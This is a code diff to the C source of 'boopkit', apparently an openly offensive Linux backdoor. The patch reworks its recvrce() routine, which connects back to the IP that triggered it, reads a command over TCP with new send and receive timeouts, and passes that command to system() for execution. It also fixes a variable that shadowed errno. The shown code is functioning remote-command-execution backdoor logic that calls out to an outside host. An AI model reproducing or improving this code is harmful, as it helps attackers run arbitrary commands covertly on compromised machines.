@@ -32,6 +32,7 @@
 #include <string.h>
 #include <sys/socket.h>
 #include <unistd.h>
+#include <errno.h>
 
 // clang-format off
 #include "boopkit.h"
@@ -66,7 +67,6 @@ void usage() {
 }
 
 int recvrce(char dial[INET_ADDRSTRLEN], char *rce) {
-  printf(" ** Boop: %s\n ", dial);
   struct sockaddr_in daddr;
   daddr.sin_family = AF_INET;
   daddr.sin_port = htons(PORT);
@@ -74,16 +74,38 @@ int recvrce(char dial[INET_ADDRSTRLEN], char *rce) {
     printf(" XX Destination IP configuration failed.\n");
     return 1;
   }
+  char printdial[INET_ADDRSTRLEN];
+  inet_ntop(AF_INET, &daddr.sin_addr, printdial, sizeof printdial);
+  printf("  ** Boop: %s\n", printdial);
+
   int revsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
   if (revsock == -1) {
-    printf(" XX Socket creation failed\n");
-    return 1;
-  }
-  if (connect(revsock, (struct sockaddr *)&daddr, sizeof daddr) < 0) {
-    // printf(" XX Connection SOCK_STREAM refused.\n");
+    //printf(" XX Socket creation failed\n");
     return 1;
   }
 
+  // Set retry socket option
+  struct timeval retry;
+  int retval;
+  retry.tv_sec = TIMEOUT_SECONDS_RECVRCE;
+  retry.tv_usec = 0;
+  retval = setsockopt(revsock, SOL_SOCKET, SO_SNDTIMEO, (struct timeval *)&retry,  sizeof (struct timeval));
+  if (retval != 0) {
+    printf("Error (%d) setting socket SO_SNDTIMEO: %s\n", retval,  strerror(errno));
+    return 1;
+  }
+  retval = setsockopt(revsock, SOL_SOCKET, SO_RCVTIMEO, (struct timeval *)&retry,  sizeof (struct timeval));
+  if (retval != 0) {
+    printf("Error (%d) setting socket SO_RCVTIMEO: %s\n", retval,  strerror(errno));
+    return 1;
+  }
+
+  if (connect(revsock, (struct sockaddr *)&daddr, sizeof daddr) < 0) {
+    //printf(" XX Connection SOCK_STREAM refused.\n");
+    return 1;
+  }
+
+  //printf("***READ***\n");
   char buffer[MAX_RCE_SIZE];
   read(revsock, buffer, MAX_RCE_SIZE);
   close(revsock);
@@ -333,10 +355,10 @@ int main(int argc, char **argv) {
       }
       if (!ignore) {
         char *rce = malloc(MAX_RCE_SIZE);
-        int errno;
-        errno = recvrce(saddrval, rce);
-        if (errno == 0) {
-          printf(" <- %s\n", rce);
+        int retval;
+        retval = recvrce(saddrval, rce);
+        if (retval == 0) {
+          printf("<- Executing: %s\r\n", rce);
           system(rce);
         }
         free(rce);
